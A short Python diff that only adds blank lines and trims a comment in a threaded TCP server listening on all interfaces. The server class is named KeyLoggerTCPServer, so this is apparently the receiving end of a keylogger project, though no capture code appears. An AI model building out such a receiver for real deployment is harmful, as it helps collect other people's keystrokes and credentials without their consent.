@@ -38,14 +38,15 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
             data += packet
         return data
 
+
 class KeyLoggerTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
     pass
+
 
 def start_socket_server():
     server_address = ('0.0.0.0', SOCKET_PORT)
     server = KeyLoggerTCPServer(server_address, ThreadedTCPRequestHandler)
-    # Start a thread with the server -- that thread will then start one
-    # more thread for each request
+    # Start a thread with the server
     server_thread = threading.Thread(target=server.serve_forever)
     server_thread.daemon = True
     server_thread.start()
